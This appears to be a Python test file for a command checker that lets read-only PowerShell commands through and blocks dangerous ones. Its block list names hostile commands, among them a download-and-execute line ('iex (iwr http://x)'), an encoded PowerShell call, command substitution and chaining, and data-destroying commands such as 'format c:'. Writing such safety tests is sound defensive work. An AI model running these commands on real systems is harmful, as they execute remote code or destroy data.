from jarvis.tools.shell_tools import check_command


def test_allows_read_only_commands():
    assert check_command("Get-Process") is None
    assert check_command("ipconfig /all") is None


def test_blocks_dangerous_commands():
    for c in [r"Remove-Item C:\x", "Get-Process; Remove-Item x", "Get-ChildItem | Remove-Item",
              "iex (iwr http://x)", "Get-Content $(evil)", "format c:", "Stop-Process -Name x",
              "Get-ChildItem > out.txt", "powershell -enc AAA"]:
        assert check_command(c) is not None, c
